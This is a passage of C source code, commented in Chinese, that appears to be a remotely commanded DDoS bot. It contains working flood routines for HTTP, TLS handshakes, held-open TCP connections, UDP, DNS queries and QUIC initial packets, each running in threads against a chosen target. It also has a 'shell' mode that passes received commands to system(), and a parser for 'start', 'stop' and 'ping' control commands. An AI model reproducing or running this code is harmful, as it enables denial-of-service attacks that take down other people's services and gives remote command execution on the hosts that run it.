                        if (len > 0) added += len;
                    }
                    break;
                case 4:
                    if (remaining >= 20) {
                        int len = snprintf(request + base_len + added, remaining, 
                            "Priority: u=0, i\r\n");
                        if (len > 0) added += len;
                    }
                    break;
                case 5:
                    if (remaining >= 30) {
                        int len = snprintf(request + base_len + added, remaining, 
                            "X-Request-ID: %08x\r\n", (unsigned int)(requests + time(NULL)));
                        if (len > 0) added += len;
                    }
                    break;
            }
            
            if (remaining <= 4) {
                // 空间不足，跳出循环
                break;
            }
            
            header_idx++;
        }
    }
    
    // 添加结束符
    int total_len = base_len + strlen(request + base_len);
    if (total_len + 4 < (int)sizeof(request)) {
        strcat(request, "\r\n");
        total_len += 2;
    } else {
        // 缓冲区已满，直接覆盖最后的部分
        strcpy(request + sizeof(request) - 4, "\r\n");
        total_len = sizeof(request);
    }
    
    // 记录请求构造信息
    log_message("线程 %d: 构造HTTP请求，总大小: %d 字节, Host: %s, 路径: %s", 
               data->thread_num, total_len, host_header, params->path);
    
    // 使用已解析的IP地址
    const char *target_to_use = (resolved_ip[0] != '\0') ? resolved_ip : params->target_ip;
    int consecutive_failures = 0;  // 连续失败计数
    time_t last_success_time = time(NULL);
    
    // 主攻击循环
    while (!global_stop && !params->stop) {
        if (params->duration > 0 && (time(NULL) - start) >= params->duration) {
            break;
        }
        
        // 连接管理：如果套接字无效，创建新连接
        if (sock < 0) {
            // 创建TCP套接字
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) {
                if (consecutive_failures % 10 == 0) {
                    log_message("线程 %d: 创建套接字失败: %s", 
                               data->thread_num, strerror(errno));
                }
                consecutive_failures++;
                usleep(10000 * (consecutive_failures < 10 ? consecutive_failures : 10));
                continue;
            }
            
            // 设置非阻塞模式（用于连接超时）
            int flags = fcntl(sock, F_GETFL, 0);
            fcntl(sock, F_SETFL, flags | O_NONBLOCK);
            
            // 连接服务器
            int connect_result = connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
            if (connect_result < 0) {
                if (errno == EINPROGRESS) {
                    // 连接正在进行中，使用select等待
                    fd_set fdset;
                    struct timeval tv;
                    
                    FD_ZERO(&fdset);
                    FD_SET(sock, &fdset);
                    tv.tv_sec = 2;  // 2秒连接超时
                    tv.tv_usec = 0;
                    
                    if (select(sock + 1, NULL, &fdset, NULL, &tv) == 1) {
                        int so_error;
                        socklen_t len = sizeof(so_error);
                        getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
                        if (so_error == 0) {
                            // 连接成功
                            connect_result = 0;
                        }
                    }
                }
            }
            
            if (connect_result < 0) {
                // 连接失败
                close(sock);
                sock = -1;
                
                if (consecutive_failures % 5 == 0) {
                    log_message("线程 %d: 连接到 %s:%d 失败 (错误: %s)", 
                               data->thread_num, target_to_use, params->target_port, strerror(errno));
                }
                consecutive_failures++;
                
                // 指数退避重连策略
                int backoff_time = 10000 * (1 << (consecutive_failures < 6 ? consecutive_failures : 6));
                usleep(backoff_time);
                continue;
            }
            
            // 设置回阻塞模式以获得更好性能
            fcntl(sock, F_SETFL, flags);
            
            // 设置发送/接收超时
            struct timeval timeout;
            timeout.tv_sec = 2;
            timeout.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
            
            // 设置TCP_NODELAY禁用Nagle算法，减少延迟
            int nodelay = 1;
            setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (void *)&nodelay, sizeof(nodelay));
            
            log_message("线程 %d: 成功连接到 %s:%d，开始攻击", 
                       data->thread_num, target_to_use, params->target_port);
            consecutive_failures = 0;
            last_success_time = time(NULL);
        }
        
        // 发送HTTP请求
        int sent = send(sock, request, total_len, 0);
        if (sent <= 0) {
            // 发送失败，可能是连接已断开
            if (sent < 0 && (errno == ECONNRESET || errno == EPIPE || errno == ETIMEDOUT)) {
                log_message("线程 %d: 连接中断 (%s)，准备重连", 
                           data->thread_num, strerror(errno));
                close(sock);
                sock = -1;
                consecutive_failures++;
                continue;
            } else {
                if (requests % 100 == 0) {
                    log_message("线程 %d: 发送失败: %s", 
                               data->thread_num, strerror(errno));
                }
                
                // 尝试重新发送
                usleep(1000);
                continue;
            }
        }
        
        // 更新统计
        requests++;
        data->packets_sent = requests;
        last_success_time = time(NULL);
        
        // 可选：接收响应（非阻塞，避免缓冲区满）
        char response[1024];
        int received = recv(sock, response, sizeof(response)-1, MSG_DONTWAIT);
        if (received > 0) {
            response[received] = '\0';
            
            // 检查是否收到HTTP错误响应
            if (strstr(response, "HTTP/1.1 4") || strstr(response, "HTTP/1.1 5")) {
                // 服务器返回错误，可能是过载或防护
                if (requests % 1000 == 0) {
                    char status[32] = {0};
                    sscanf(response, "%*s %31s", status);
                    log_message("线程 %d: 服务器返回错误: %s", data->thread_num, status);
                }
            } else if (received > 0 && requests % 2000 == 0) {
                // 每2000个请求记录一次成功响应
                log_message("线程 %d: 收到响应，大小: %d 字节", data->thread_num, received);
            }
        } else if (received == 0) {
            // 对方已关闭连接
            log_message("线程 %d: 连接被服务器关闭", data->thread_num);
            close(sock);
            sock = -1;
            consecutive_failures++;
            continue;
        } else if (received < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            // 接收错误
            if (requests % 1000 == 0) {
                log_message("线程 %d: 接收错误: %s", data->thread_num, strerror(errno));
            }
        }
        
        // 控制请求速率
        if (params->pps > 0) {
            // 如果指定了每秒包数，计算延迟
            static unsigned long last_time = 0;
            unsigned long current_time = time(NULL) * 1000000;
            unsigned long interval = 1000000 / params->pps;  // 微秒间隔
            
            if (last_time > 0 && (current_time - last_time) < interval) {
                usleep(interval - (current_time - last_time));
            }
            last_time = time(NULL) * 1000000;
        } else {
            // 默认延迟
            usleep(1000);
        }
        
        // 检查连接健康状态
        if (time(NULL) - last_success_time > 5) {
            // 5秒内没有成功发送，可能连接已死
            log_message("线程 %d: 连接无响应超过5秒，重新连接", data->thread_num);
            close(sock);
            sock = -1;
            consecutive_failures = 0;
        }
        
        // 定期日志
        if (requests % 10000 == 0) {
            time_t now = time(NULL);
            double elapsed = difftime(now, start);
            double rps = elapsed > 0 ? requests / elapsed : requests;
            
            log_message("线程 %d: 已发送 %lu 个请求 (%.2f 请求/秒), 当前连接: %s", 
                       data->thread_num, requests, rps, sock >= 0 ? "活跃" : "断开");
        }
    }
    
    // 清理
    if (sock >= 0) {
        close(sock);
    }
    
    time_t end = time(NULL);
    double elapsed = difftime(end, start);
    double rps = elapsed > 0 ? requests / elapsed : requests;
    
    log_message("线程 %d: HTTP攻击完成，发送 %lu 个请求，平均 %.2f 请求/秒，连接复用率: %.2f", 
               data->thread_num, requests, rps, (requests > 0 ? (double)(requests - consecutive_failures) / requests * 100 : 0));
    
    return NULL;
}

// TLS握手攻击（支持数据包大小） - 优化版本，只解析一次域名
static void *attack_tls(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackParams *params = data->params;
    unsigned long handshakes = 0;
    time_t start = time(NULL);
    
    // 预先解析域名
    char resolved_ip[16] = {0};
    struct sockaddr_in target_addr;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(params->target_port);
    
    // 如果target_ip看起来是IP地址，直接使用
    if (inet_aton(params->target_ip, &target_addr.sin_addr) == 0) {
        // 尝试解析域名
        struct hostent *he = gethostbyname(params->target_ip);
        if (he == NULL) {
            log_message("线程 %d: 域名解析失败: %s", data->thread_num, params->target_ip);
            return NULL;
        }
        memcpy(&target_addr.sin_addr, he->h_addr, he->h_length);
        inet_ntop(AF_INET, he->h_addr, resolved_ip, sizeof(resolved_ip));
        log_message("线程 %d: 域名解析完成: %s -> %s", data->thread_num, params->target_ip, resolved_ip);
    } else {
        strncpy(resolved_ip, params->target_ip, sizeof(resolved_ip)-1);
    }
    
    // 计算数据包大小
    unsigned int packet_size = params->packet_size;
    if (packet_size < MIN_PACKET_SIZE) packet_size = MIN_PACKET_SIZE;
    if (packet_size > 16384) packet_size = 16384;  // 合理的TLS记录大小
    
    // 基础TLS ClientHello
    unsigned char tls_hello[] = {
        0x16, 0x03, 0x01, 0x00, 0x40, 0x01, 0x00, 0x00, 0x3c, 0x03, 0x03,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x01, 0x00,
        0x00, 0x00
    };
    
    int base_len = sizeof(tls_hello);
    
    // 使用已解析的IP地址
    const char *target_to_use = (resolved_ip[0] != '\0') ? resolved_ip : params->target_ip;
    
    if (packet_size > (unsigned int)base_len) {
        int fill_size = packet_size - base_len;
        
        // 分配完整数据包
        unsigned char *packet = malloc(packet_size);
        if (!packet) {
            log_message("线程 %d: 内存分配失败", data->thread_num);
            return NULL;
        }
        
        memcpy(packet, tls_hello, base_len);
        
        // 填充随机数据
        fill_random_data((char *)(packet + base_len), fill_size);
        
        // 更新TLS记录长度字段（大端序）
        int total_len = packet_size - 5;  // 减去记录头5字节
        packet[3] = (total_len >> 8) & 0xFF;
        packet[4] = total_len & 0xFF;
        
        while (!global_stop && !params->stop) {
            if (params->duration > 0 && (time(NULL) - start) >= params->duration) {
                break;
            }
            
            int sock = create_tcp_socket(0);
            if (sock >= 0) {
                // 使用已解析的IP地址连接
                if (tcp_connect_to_ip(sock, target_to_use, params->target_port) == 0) {
                    send(sock, packet, packet_size, 0);
                    handshakes++;
                    data->packets_sent = handshakes;
                    
                    shutdown(sock, SHUT_RDWR);
                }
                close(sock);
            }
            
            usleep(1000);
        }
        
        free(packet);
    } else {
        // 使用基础TLS握手
        while (!global_stop && !params->stop) {
            if (params->duration > 0 && (time(NULL) - start) >= params->duration) {
                break;
            }
            
            int sock = create_tcp_socket(0);
            if (sock >= 0) {
                // 使用已解析的IP地址连接
                if (tcp_connect_to_ip(sock, target_to_use, params->target_port) == 0) {
                    send(sock, tls_hello, sizeof(tls_hello), 0);
                    handshakes++;
                    data->packets_sent = handshakes;
                    
                    shutdown(sock, SHUT_RDWR);
                }
                close(sock);
            }
            
            usleep(1000);
        }
    }
    
    log_message("线程 %d: TLS攻击完成，尝试 %lu 次握手，包大小: %u 字节", 
                data->thread_num, handshakes, packet_size);
    return NULL;
}

// TCP长连接攻击（建立连接后保持并持续发送数据）
static void *attack_tcp_conn(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackParams *params = data->params;
    unsigned long packets = 0;
    time_t start = time(NULL);
    
    // 预先解析域名
    char resolved_ip[16] = {0};
    struct sockaddr_in target_addr;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(params->target_port);
    
    if (inet_aton(params->target_ip, &target_addr.sin_addr) == 0) {
        struct hostent *he = gethostbyname(params->target_ip);
        if (he == NULL) {
            log_message("线程 %d: 域名解析失败: %s", data->thread_num, params->target_ip);
            return NULL;
        }
        memcpy(&target_addr.sin_addr, he->h_addr, he->h_length);
        inet_ntop(AF_INET, he->h_addr, resolved_ip, sizeof(resolved_ip));
    } else {
        strncpy(resolved_ip, params->target_ip, sizeof(resolved_ip)-1);
    }
    
    // 计算数据包大小
    unsigned int packet_size = params->packet_size;
    if (packet_size < MIN_PACKET_SIZE) packet_size = MIN_PACKET_SIZE;
    if (packet_size > 1460) packet_size = 1460;
    
    // 创建数据缓冲区
    char *buffer = malloc(packet_size);
    if (!buffer) {
        log_message("线程 %d: 内存分配失败", data->thread_num);
        return NULL;
    }
    fill_random_data(buffer, packet_size);
    
    // 创建并维护多个长连接
    int *socks = NULL;
    int sock_count = params->concurrent;
    if (sock_count < 1) sock_count = 1;
    if (sock_count > MAX_CONNECTIONS) sock_count = MAX_CONNECTIONS;
    
    socks = malloc(sock_count * sizeof(int));
    if (!socks) {
        free(buffer);
        log_message("线程 %d: 内存分配失败", data->thread_num);
        return NULL;
    }
    
    for (int i = 0; i < sock_count; i++) {
        socks[i] = -1;
    }
    
    const char *target_to_use = (resolved_ip[0] != '\0') ? resolved_ip : params->target_ip;
    int active_connections = 0;
    
    log_message("线程 %d: TCP长连接攻击开始，目标: %s:%d, 并发连接: %d", 
                data->thread_num, target_to_use, params->target_port, sock_count);
    
    while (!global_stop && !params->stop) {
        if (params->duration > 0 && (time(NULL) - start) >= params->duration) {
            break;
        }
        
        // 维护连接池
        for (int i = 0; i < sock_count; i++) {
            if (socks[i] < 0) {
                // 创建新连接
                socks[i] = create_tcp_socket(0);
                if (socks[i] >= 0) {
                    if (tcp_connect_to_ip(socks[i], target_to_use, params->target_port) == 0) {
                        active_connections++;
                        if (active_connections % 10 == 0) {
                            log_message("线程 %d: 活跃连接数: %d", data->thread_num, active_connections);
                        }
                    } else {
                        close(socks[i]);
                        socks[i] = -1;
                    }
                }
            } else {
                // 在活跃连接上发送数据
                int sent = send(socks[i], buffer, packet_size, 0);
                if (sent > 0) {
                    packets++;
                    data->packets_sent = packets;
                    
                    // 可选：偶尔接收一点数据保持连接活跃
                    if (packets % 100 == 0) {
                        char temp[128];
                        recv(socks[i], temp, sizeof(temp), MSG_DONTWAIT);
                    }
                } else {
                    // 连接断开
                    close(socks[i]);
                    socks[i] = -1;
                    active_connections--;
                }
            }
        }
        
        // 控制发送速率
        if (params->rate > 0) {
            usleep(1000000 / params->rate);
        } else {
            usleep(1000);  // 默认1ms间隔
        }
    }
    
    // 清理连接
    for (int i = 0; i < sock_count; i++) {
        if (socks[i] >= 0) {
            shutdown(socks[i], SHUT_RDWR);
            close(socks[i]);
        }
    }
    
    free(socks);
    free(buffer);
    
    log_message("线程 %d: TCP长连接攻击完成，发送 %lu 个包，最大并发: %d", 
                data->thread_num, packets, active_connections);
    return NULL;
}

// UDP头部结构
struct udp_header {
    uint16_t source;
    uint16_t dest;
    uint16_t len;
    uint16_t check;
};

// UDP Flood攻击函数
static void *attack_udp(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackParams *params = data->params;
    unsigned long packets = 0;
    time_t start = time(NULL);
    
    // 获取本地IP
    unsigned int local_ip = get_local_ip(params->target_ip, params->target_port);
    if (local_ip == 0) {
        local_ip = inet_addr("127.0.0.1");
    }
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    }
    
    if (sock < 0) {
        log_message("线程 %d: 无法创建UDP套接字", data->thread_num);
        return NULL;
    }
    
    // 设置socket选项提高性能
    int broadcast = 1;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
    
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(params->target_ip);
    dest.sin_port = htons(params->target_port);
    
    // 计算数据包大小
    unsigned int packet_size = params->packet_size;
    if (packet_size < MIN_PACKET_SIZE) packet_size = MIN_PACKET_SIZE;
    if (packet_size > MAX_PACKET_SIZE) packet_size = MAX_PACKET_SIZE;
    
    // 分配数据包缓冲区
    char *packet = malloc(packet_size);
    if (!packet) {
        close(sock);
        log_message("线程 %d: 内存分配失败", data->thread_num);
        return NULL;
    }
    
    // 构造UDP数据包
    struct udp_header *udph = (struct udp_header *)packet;
    char *udp_data = packet + sizeof(struct udp_header);
    int data_size = packet_size - sizeof(struct udp_header);
    if (data_size < 0) data_size = 0;
    
    while (!global_stop && !params->stop) {
        if (params->duration > 0 && (time(NULL) - start) >= params->duration) {
            break;
        }
        
        // 使用随机源端口
        unsigned short src_port = random_port();
        
        // 填充UDP头部
        udph->source = htons(src_port);
        udph->dest = htons(params->target_port);
        udph->len = htons(packet_size);
        udph->check = 0;  // UDP校验和可选
        
        // 填充随机数据
        if (data_size > 0) {
            fill_random_data(udp_data, data_size);
        }
        
        // 发送UDP数据包
        sendto(sock, packet, packet_size, 0, (struct sockaddr *)&dest, sizeof(dest));
        
        packets++;
        data->packets_sent = packets;
        
        // 控制速率
        if (params->rate > 0) {
            usleep(1000000 / params->rate);
        }
        
        // 每1000个包记录一次
        if (packets % 1000 == 0) {
            log_message("线程 %d: 已发送 %lu 个UDP包到 %s:%d", 
                       data->thread_num, packets, params->target_ip, params->target_port);
        }
    }
    
    free(packet);
    close(sock);
    
    log_message("线程 %d: UDP攻击完成，发送 %lu 个包，包大小: %u 字节", 
                data->thread_num, packets, packet_size);
    return NULL;
}

// DNS头部结构
struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

// DNS查询攻击函数
static void *attack_dns(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackParams *params = data->params;
    unsigned long queries = 0;
    time_t start = time(NULL);
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        log_message("线程 %d: 无法创建UDP套接字", data->thread_num);
        return NULL;
    }
    
    // 设置socket选项
    int timeout = 1000;  // 1秒超时
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    
    struct sockaddr_in dns_server;
    memset(&dns_server, 0, sizeof(dns_server));
    dns_server.sin_family = AF_INET;
    dns_server.sin_addr.s_addr = inet_addr(params->target_ip);
    dns_server.sin_port = htons(params->target_port);
    
    // 计算数据包大小
    unsigned int packet_size = params->packet_size;
    if (packet_size < MIN_PACKET_SIZE) packet_size = MIN_PACKET_SIZE;
    if (packet_size > 512) packet_size = 512;  // DNS通常不超过512字节
    
    // 分配DNS查询包缓冲区
    char *dns_query = malloc(packet_size);
    if (!dns_query) {
        close(sock);
        log_message("线程 %d: 内存分配失败", data->thread_num);
        return NULL;
    }
    
    // 确定查询域名
    char query_domain[256];
    if (strlen(params->hostname) > 0) {
        strncpy(query_domain, params->hostname, sizeof(query_domain)-1);
    } else {
        // 生成随机域名
        snprintf(query_domain, sizeof(query_domain), 
                "%08x-%08x.example.com", get_random(), get_random());
    }
    
    log_message("线程 %d: DNS攻击，目标DNS服务器: %s:%d, 查询域名: %s", 
                data->thread_num, params->target_ip, params->target_port, query_domain);
    
    while (!global_stop && !params->stop) {
        if (params->duration > 0 && (time(NULL) - start) >= params->duration) {
            break;
        }
        
        // 构造DNS查询包
        struct dns_header *dns_hdr = (struct dns_header *)dns_query;
        
        // 填充DNS头部
        dns_hdr->id = htons(get_random());
        dns_hdr->flags = htons(0x0100);  // 标准查询，递归期望
        dns_hdr->qdcount = htons(1);     // 1个问题
        dns_hdr->ancount = 0;
        dns_hdr->nscount = 0;
        dns_hdr->arcount = 0;
        
        // 构造查询问题部分
        char *ptr = dns_query + sizeof(struct dns_header);
        char *domain_ptr = query_domain;
        
        // 将域名转换为DNS格式 (www.example.com -> 3www7example3com0)
        while (*domain_ptr) {
            char *dot = strchr(domain_ptr, '.');
            int len;
            if (dot) {
                len = dot - domain_ptr;
            } else {
                len = strlen(domain_ptr);
            }
            
            *ptr++ = len;
            memcpy(ptr, domain_ptr, len);
            ptr += len;
            
            if (dot) {
                domain_ptr = dot + 1;
            } else {
                domain_ptr += len;
                break;
            }
        }
        *ptr++ = 0;  // 域名结束
        
        // 查询类型和类
        *((uint16_t *)ptr) = htons(1);  // A记录
        ptr += 2;
        *((uint16_t *)ptr) = htons(1);  // IN类
        ptr += 2;
        
        int query_len = ptr - dns_query;
        
        // 填充到指定数据包大小
        if (packet_size > query_len) {
            // 填充随机数据
            srand(time(NULL) ^ data->thread_num ^ queries);
            for (int i = query_len; i < packet_size; i++) {
                dns_query[i] = rand() % 256;
            }
        }
        
        // 发送DNS查询，使用指定的数据包大小
        sendto(sock, dns_query, packet_size, 0, 
               (struct sockaddr *)&dns_server, sizeof(dns_server));
        
        queries++;
        data->packets_sent = queries;
        
        // 可选可选：接收响应（非阻塞）
        char response[512];
        struct sockaddr_in from;
        socklen_t from_len = sizeof(from);
        recvfrom(sock, response, sizeof(response), MSG_DONTWAIT, 
                (struct sockaddr *)&from, &from_len);
        
        // 控制查询速率
        if (params->rate > 0) {
            usleep(1000000 / params->rate);
        } else {
            usleep(10000);  // 默认100QPS
        }
        
        // 每100个查询记录一次
        if (queries % 100 == 0) {
            log_message("线程 %d: 已发送 %lu 个DNS查询", data->thread_num, queries);
        }
    }
    
    free(dns_query);
    close(sock);
    
    log_message("线程 %d: DNS攻击完成，发送 %lu 个查询", data->thread_num, queries);
    return NULL;
}

// QUIC协议攻击函数
static void *attack_quic(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackParams *params = data->params;
    unsigned long packets = 0;
    time_t start = time(NULL);
    
    // 预先解析域名
    char resolved_ip[16] = {0};
    struct sockaddr_in target_addr;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(params->target_port);
    
    if (inet_aton(params->target_ip, &target_addr.sin_addr) == 0) {
        struct hostent *he = gethostbyname(params->target_ip);
        if (he == NULL) {
            log_message("线程 %d: 域名解析失败: %s", data->thread_num, params->target_ip);
            return NULL;
        }
        memcpy(&target_addr.sin_addr, he->h_addr, he->h_length);
        inet_ntop(AF_INET, he->h_addr, resolved_ip, sizeof(resolved_ip));
    } else {
        strncpy(resolved_ip, params->target_ip, sizeof(resolved_ip)-1);
    }
    
    // 计算数据包大小
    unsigned int packet_size = params->packet_size;
    if (packet_size < MIN_PACKET_SIZE) packet_size = MIN_PACKET_SIZE;
    if (packet_size > 1350) packet_size = 1350;  // QUIC通常不超过1350
    
    // 基础QUIC初始包（简化版本）
    unsigned char quic_initial[] = {
        // 长头部，版本1，初始包
        0xc0, 0x00, 0x00, 0x00, 0x01,  // 头部字节
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // 随机连接ID
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00,  // 令牌长度
        0x00, 0x00,  // 数据长度占位符
        // CRYPTO帧
        0x06,  // CRYPTO帧类型
        0x00, 0x00,  // 偏移
        0x01,  // 数据长度
        0x00   // 加密数据
    };
    
    int base_len = sizeof(quic_initial);
    
    const char *target_to_use = (resolved_ip[0] != '\0') ? resolved_ip : params->target_ip;
    
    if (packet_size > (unsigned int)base_len) {
        int fill_size = packet_size - base_len;
        
        unsigned char *packet = malloc(packet_size);
        if (!packet) {
            log_message("线程 %d: 内存分配失败", data->thread_num);
            return NULL;
        }
        
        memcpy(packet, quic_initial, base_len);
        
        // 填充随机数据
        fill_random_data((char *)(packet + base_len), fill_size);
        
        // 使用UDP套接字（QUIC基于UDP）
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) {
            free(packet);
            log_message("线程 %d: 无法创建UDP套接字", data->thread_num);
            return NULL;
        }
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = inet_addr(target_to_use);
        dest.sin_port = htons(params->target_port);
        
        while (!global_stop && !params->stop) {
            if (params->duration > 0 && (time(NULL) - start) >= params->duration) {
                break;
            }
            
            // 生成随机连接ID
            for (int i = 5; i < 21; i++) {
                packet[i] = get_random() % 256;
            }
            
            // 发送QUIC初始包
            sendto(sock, packet, packet_size, 0, (struct sockaddr *)&dest, sizeof(dest));
            
            packets++;
            data->packets_sent = packets;
            
            // 控制速率
            if (params->rate > 0) {
                usleep(1000000 / params->rate);
            }
            
            // 每100个包记录一次
            if (packets % 100 == 0) {
                log_message("线程 %d: 已发送 %lu 个QUIC包到 %s:%d", 
                          data->thread_num, packets, target_to_use, params->target_port);
            }
        }
        
        free(packet);
        close(sock);
    } else {
        // 使用基础QUIC包
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock >= 0) {
            struct sockaddr_in dest;
            memset(&dest, 0, sizeof(dest));
            dest.sin_family = AF_INET;
            dest.sin_addr.s_addr = inet_addr(target_to_use);
            dest.sin_port = htons(params->target_port);
            
            while (!global_stop && !params->stop) {
                if (params->duration > 0 && (time(NULL) - start) >= params->duration) {
                    break;
                }
                
                // 生成随机连接ID
                for (int i = 5; i < 21; i++) {
                    quic_initial[i] = get_random() % 256;
                }
                
                sendto(sock, quic_initial, sizeof(quic_initial), 0, 
                      (struct sockaddr *)&dest, sizeof(dest));
                
                packets++;
                data->packets_sent = packets;
                
                if (params->rate > 0) {
                    usleep(1000000 / params->rate);
                }
            }
            
            close(sock);
        }
    }
    
    log_message("线程 %d: QUIC攻击完成，发送 %lu 个包", data->thread_num, packets);
    return NULL;
}

// Shell命令执行（此模式不涉及数据包大小，但保持接口一致）
static void *attack_shell(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackParams *params = data->params;
    time_t start = time(NULL);
    
    while (!global_stop && !params->stop) {
        if (params->duration > 0 && (time(NULL) - start) >= params->duration) {
            break;
        }
        
        if (strlen(params->shell_cmd) > 0) {
            system(params->shell_cmd);
            data->packets_sent++;
        }
        
        usleep(1000000);
    }
    
    log_message("线程 %d: Shell命令执行完成", data->thread_num);
    return NULL;
}

// 修改attack_dispatcher函数支持新模式
static void *attack_dispatcher(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    
    switch (data->params->mode) {
        case MODE_SYN:
            return attack_syn(data);
        case MODE_ACK:
            return attack_ack(data);
        case MODE_TCP:
            return attack_tcp(data);
        case MODE_TCP_CONN:  // 新增
            return attack_tcp_conn(data);
        case MODE_UDP:       // 新增
            return attack_udp(data);
        case MODE_HTTP:
            return attack_http(data);
        case MODE_TLS:
            return attack_tls(data);
        case MODE_DNS:       // 新增
            return attack_dns(data);
        case MODE_QUIC:      // 新增
            return attack_quic(data);
        case MODE_SHELL:
            return attack_shell(data);
        default:
            log_message("线程 %d: 未知攻击模式", data->thread_num);
            break;
    }
    
    return NULL;
}

// 停止攻击
static void stop_attack() {
    pthread_mutex_lock(&attack_mutex);
    
    if (!current_attack.running) {
        pthread_mutex_unlock(&attack_mutex);
        return;
    }
    
    current_attack.stop = 1;
    current_attack.running = 0;
    
    for (int i = 0; i < active_threads; i++) {
        pthread_join(attack_threads[i], NULL);
    }
    
    unsigned long total_packets = 0;
    for (int i = 0; i < active_threads; i++) {
        total_packets += thread_data[i].packets_sent;
    }
    
    time_t duration = time(NULL) - current_attack.start_time;
    log_message("攻击已停止: 持续%ld秒, 总包数=%lu, 包大小=%u字节", 
                duration, total_packets, current_attack.packet_size);
    
    active_threads = 0;
    // 注意：这里不清零整个结构体，只重置关键字段，防止竞态条件
    current_attack.stop = 0;
    current_attack.running = 0;
    current_attack.start_time = 0;
    
    pthread_mutex_unlock(&attack_mutex);
}

// 开始攻击
static void start_attack(AttackParams *params) {
    pthread_mutex_lock(&attack_mutex);
    
    if (current_attack.running) {
        log_message("已有攻击正在进行，先停止当前攻击");
        stop_attack();
    }
    
    memcpy(&current_attack, params, sizeof(AttackParams));
    current_attack.running = 1;
    current_attack.stop = 0;
    current_attack.start_time = time(NULL);
    
    active_threads = 0;
    unsigned int threads = params->threads;
    if (threads > MAX_THREADS) threads = MAX_THREADS;
    if (threads < 1) threads = 1;
    
    for (unsigned int i = 0; i < threads; i++) {
        thread_data[i].thread_num = i;
        thread_data[i].params = &current_attack;
        thread_data[i].packets_sent = 0;
        
        if (pthread_create(&attack_threads[i], NULL, attack_dispatcher, &thread_data[i]) == 0) {
            active_threads++;
        }
    }
    
    log_message("攻击已启动: 模式=%d, 目标=%s:%d, 包大小=%u字节, 线程=%d, 持续时间=%d秒",
                params->mode, params->target_ip, params->target_port,
                params->packet_size, active_threads, params->duration);
    
    pthread_mutex_unlock(&attack_mutex);
}

// ========================= 命令处理 =========================
// 解析命令（增加数据包大小参数） - 修复版本
static int parse_command(const char *cmd, AttackParams *params) {
    char buffer[COMMAND_BUFFER];
    char *tokens[25];  // 增加令牌数量以容纳新参数
    int token_count = 0;
    
    strncpy(buffer, cmd, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';
    
    char *token = strtok(buffer, " ");
    while (token != NULL && token_count < 25) {
        tokens[token_count++] = token;
        token = strtok(NULL, " ");
    }
    
    if (token_count < 1) {
        return -1;  // 空命令
    }
    
    // 修复：允许单令牌命令
    if (token_count == 1) {
        if (strcmp(tokens[0], "stop") == 0) {
            return 2;  // stop命令
        } else if (strcmp(tokens[0], "ping") == 0 || strcmp(tokens[0], "PING") == 0) {
            return 3;  // ping命令
        } else {
            return 0;  // 未知单令牌命令
        }
    }
    
    if (strcmp(tokens[0], "start") == 0) {
        if (token_count < 8) {  // 现在至少需要8个参数
            return -1;
        }
        
         // 解析模式
        if (strcmp(tokens[1], "syn") == 0) params->mode = MODE_SYN;
        else if (strcmp(tokens[1], "ack") == 0) params->mode = MODE_ACK;
        else if (strcmp(tokens[1], "tcp") == 0) params->mode = MODE_TCP;
        else if (strcmp(tokens[1], "tcp_conn") == 0) params->mode = MODE_TCP_CONN;  // 新增
        else if (strcmp(tokens[1], "udp") == 0) params->mode = MODE_UDP;           // 新增
        else if (strcmp(tokens[1], "http") == 0) params->mode = MODE_HTTP;
        else if (strcmp(tokens[1], "tls") == 0) params->mode = MODE_TLS;
        else if (strcmp(tokens[1], "dns") == 0) params->mode = MODE_DNS;           // 新增
        else if (strcmp(tokens[1], "quic") == 0) params->mode = MODE_QUIC;         // 新增
        else if (strcmp(tokens[1], "shell") == 0) params->mode = MODE_SHELL;
        else return -1;
        
        strncpy(params->target_ip, tokens[2], sizeof(params->target_ip) - 1);
        params->target_ip[sizeof(params->target_ip) - 1] = '\0';  // 确保终止符
